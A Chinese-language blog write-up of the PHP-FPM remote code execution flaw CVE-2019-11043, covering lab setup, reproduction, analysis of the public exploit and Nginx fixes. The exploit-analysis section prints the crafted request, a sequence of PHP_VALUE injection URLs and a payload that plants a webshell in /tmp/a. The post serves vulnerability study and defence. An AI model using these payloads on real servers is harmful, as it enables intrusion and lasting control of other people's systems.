---
title: CVE-2019-11043 PHP-FPM RCE - Vulnerability & Emersion
date: 2019-12-05 11:07:51
tags: [CVE,PHP]
abstract: intro for CVE-2019-11043 
header_image: /intro/post-bg-riverflowers.jpeg
top:
---

# The foregoing.
该CVE的来源很有趣，外国安研Andrew Danau做CTF题目时在URL添加0a截断，服务器响应异常，（开始以为题目利用点在此，）随后发现疑似服务器存在漏洞。随着安研们的研究，可知是php-fpm导致的问题，且若参照不当的NGINX配置(Nginx+phpfpm环境)，该CVE可被利用成RCE级的漏洞。
本文内容关于漏洞复现以及EXP简短分析，漏洞分析详见[我的另一篇文章](https://hducaiji.github.io/2019/12/06/CVE-2019-11043-2/)。
<br/>

# Build Env
## 0x01 Using Docker
使用phith0n的[vulhub](https://github.com/vulhub/vulhub)最为简洁明快：
```shell
# Download the latest version of the vulhub 
git clone https://github.com/vulhub/vulhub.git  
# Entry vulnerability directory 
cd vulhub/php/CVE-2019-11043/
# Compile (optional) 
docker-compose build 
# Run 
docker-compose up -d 
```
`curl http://{your-ip}:8080/index.php`显示`helloworld%`即配置环境成功。
当然，也可以选择CVE提交者neex提供的[docker](https://github.com/neex/phuip-fpizdam#using-docker)

## 0x02 Build by yourself
对于想要做漏洞分析，使用gdb调试的各位，**可能**搭建虚拟机调试环境会更加舒服。我这里选择Ubuntu 19.10，参照phith0n的`docker-compose.yml`搭建虚拟机漏洞环境：
* ref: [How to install PHP 7.1, 7.2 and 5.6 as PHP-FPM & FastCGI for ISPConfig 3 on Debian 9](https://www.howtoforge.com/tutorial/how-to-install-php-7-on-debian/)
1. **install PHP@7.2.10**
```shell
sudo apt-get install libfcgi-dev libfcgi0ldbl libmcrypt-dev libssl-dev libc-client2007e libc-client2007e-dev libxml2-dev libbz2-dev libcurl4-openssl-dev libjpeg-dev libpng-dev libfreetype6-dev libkrb5-dev libpq-dev libxml2-dev libxslt1-dev

wget http://de2.php.net/get/php-7.2.10.tar.bz2/from/this/mirror -O php-7.2.10.tar.bz2
./configure --prefix=/opt/php7.2.10 --enable-phpdbg-debug --enable-debug --enable-fpm CFLAGS="-g3 -gdwarf-4"
make 
sudo make install
```
2. **conf PHP-FPM**
```shell
sudo cp php.ini-development /opt/php7.2.10/etc/php.ini && cd /opt/php7.2.10
sudo cp etc/php-fpm.conf.default /etc/php-fpm.conf
sudo cp etc/php-fpm.d/www.conf.default etc/php-fpm.d/www.conf
# 为了便于研究，pm设为静态（子进程的数量由 pm.max_children 决定），并将pm.max_children设为1
sudo vim etc/php-fpm.d/www.conf
```
->
```
[www]
pm = static 
pm.max_children = 1
pm.start_servers = 1
pm.min_spare_servers = 1
pm.max_spare_servers = 1
```
```shell
cd sbin && sudo ./php-fpm -c ../etc/php.ini -y ../etc/php-fpm.conf
# 测试php-fpm是否启动
ps -ef | grep php-fpm
```
3. **install&conf Nginx**
```shell
sudo apt-get intall nginx 
vi /etc/nginx/conf.d/default.conf
```
->
```nginx
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    root /usr/share/nginx/html;

    index index.html index.php;

    server_name _;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ [^/]\.php(/|$) {
        fastcgi_split_path_info ^(.+?\.php)(/.*)$;
        include fastcgi_params;

        fastcgi_param PATH_INFO       $fastcgi_path_info;
        fastcgi_index index.php;
        fastcgi_param  REDIRECT_STATUS    200;
        fastcgi_param  SCRIPT_FILENAME /var/www/html$fastcgi_script_name;
        fastcgi_param  DOCUMENT_ROOT /var/www/html;
        fastcgi_pass 127.0.0.1:9000;
    }
}
```
```shell
sudo systemctl -l start nginx
vim /usr/share/nginx/html/index.php && vim /var/www/html/index.php 
```
->
```php
<?php
echo "hello world";
```
```shell
# 测试nginx是否可用
curl http://127.0.0.1/index.php
```
<br/>

# Vulnerability Emersion
**根据网络安全威胁信息发布管理办法(征求意见稿)-第四条(三)，该部分不提供能够完整复现该CVE的细节，仅展示效果，望周知。**
* 使用`go run . "http://{your-ip}:8080/index.php"`后我们可以通过访问`http://{your-ip}:8080/index.php?a={cmd}`执行任意命令:
![pic](exp-result.png)

> 使用vulhub部署环境的，访问两次中只有一次可以执行命令，原因是该docker采用默认的php-fpm配置，`pm=dynamic`&`pm.start_servers=2`，两次访问中只有一次是被已污染的pool处理: (原因具体详见[我的另一篇分析文章](https://hducaiji.github.io/2019/12/06/CVE-2019-11043-2/#Afterword))
```shell
> docker top xxx
PID                 USER                TIME                COMMAND
3576                root                0:00                php-fpm: master process (/usr/local/etc/php-fpm.conf)
3711                xfs                 0:00                php-fpm: pool www
3928                xfs                 0:00                php-fpm: pool www
```
<br/>

# Exp Analysis
主要分析EXP默认参数的核心利用部分代码，**附加参数、完整细节不讨论**，有兴趣的读者自行分析源码，有问题通过微博/邮箱与我交流。
参考请求包如下：
```
GET /index.php/path%0Ainfo.php?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
Host: {your-ip}
User-Agent: Mozilla/5.0
D-Pisos: 8=D
Ebut: mamku tvoyu
```
## Methods[method]
设置exp的探测方法，默认采用`session.auto_start`，它作为`php.ini`配置时会在响应头`set-cookie`自动带上`PHPSESSID`。

## NewRequester(url, cookie, delay)
解析url，并创建Requester供detect/attach作为包模版。

## Detect(requester, m, params, onlyQSL)
核心之一，用于确定`base-status-code` / `Q`填充个数/ `8=D`中等号个数..
*  首先url带上`/path\ninfo.php`，检测被0a截断时的status-code为多少，用于作为`base-status-code`。同上的参考请求包。
*  循环增加URL中`Q`个数(MinQSL(1500)->MaxQSL(1950))，直至服务器返回502，说明`path->info`指向了敏感堆（详见[漏洞分析](https://hducaiji.github.io/2019/12/06/CVE-2019-11043-2/#Control-configuration)），导致崩溃，将该URL长度加入候选。最后将每个候选值-5/-10同样加入候选。
*  通过`SanityCheck()`检测相关问题。
*  通过`MakePathInfo(method.PHPOptionEnable)`设置URL使用`/PHP_VALUE%0Asession.auto_start=1`，与`PosOffset`即34的长度差距用`;`补齐，让URL总长度保持固定。
*  针对每个候选值，依旧循环增加URL中`Q`个数(MinQSL(1500)->MaxQSL(1950))，根据响应头中有无`PHPSESSID`判断是否利用成功，利用成功后确定`Q`和`=`个数，即`qsl`和`pl`值。
*  通过`SetSetting`将`session.auto_start`置回0。

## Attack(requester, params)
接下来展开利用，依次写入如下配置：
> 1. /index.php/PHP_VALUE%0Ashort_open_tag=1;;;;;;;
> 2. /index.php/PHP_VALUE%0Ahtml_errors=0;;;;;;;;;;
> 3. /index.php/PHP_VALUE%0Ainclude_path=/tmp;;;;;;
> 4. /index.php/PHP_VALUE%0Aauto_prepend_file=a;;;;
> 5. /index.php/PHP_VALUE%0Alog_errors=1;;;;;;;;;;;
> 6. /index.php/PHP_VALUE%0Aerror_reporting=2;;;;;;
> 7. /index.php/PHP_VALUE%0Aerror_log=/tmp/a;;;;;;;
> 8. /index.php/PHP_VALUE%0Aextension_dir=%22%3C%3F=%60%22;;;
> 9. /index.php/PHP_VALUE%0Aextension=%22$_GET%5Ba%5D%60%3F%3E%22

最后，通过RCE写文件进`/tmp/a`，服务器获取资源时会自动载入，相当于对所有php页面加了马：`a=%3Becho+%27%3C%3Fphp+echo+%60%24_GET%5Ba%5D%60%3Breturn%3B%3F%3E%27%3E%2Ftmp%2Fa%3Bwhich+which`
<br/>

# Influence Surface & Repair
若Nginx配置了`fastcgi_split_path_info ^(.+?\.php)(/.*)$;`，那么会允许`.php`后添加任意内容，并转发给php-fpm处理。
那么根本上，修复有两种方法，一种是直接更新php-fpm，第二种是将不合时宜的URL直接404，比如参照[官方文档](https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/)添加判断：
```nginx
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
if (!-f $document_root$fastcgi_script_name) {
    return 404;
}
```
或直接：`try_files $uri =404`

随着不当的Nginx配置在网络流传，导致本不该出现的问题也会在众多服务器中存在。RCE决定了该漏洞存在get-shell、提权、持续控制等更加影响深远的问题，值得服务器维护者的关注。

# Reference
* [vulhub/php/CVE-2019-11043](https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043)
* [neex/phuip-fpizdam](https://github.com/neex/phuip-fpizdam)
* [CVE details](https://bugs.php.net/bug.php?id=78599)
* [土土's blog](https://lorexxar.cn/2019/10/25/php-fpm-rce/)
* [gingsguard blog](https://gingsguard.github.io/Nginx-PHP-FPM%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-EXP%E5%88%86%E6%9E%90/#Q%E5%AD%97%E7%AC%A6%E9%95%BF%E5%BA%A6%E5%80%99%E9%80%89%E5%80%BC%E7%A1%AE%E8%AE%A4%E9%98%B6%E6%AE%B5)
* [offical doc](https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/)

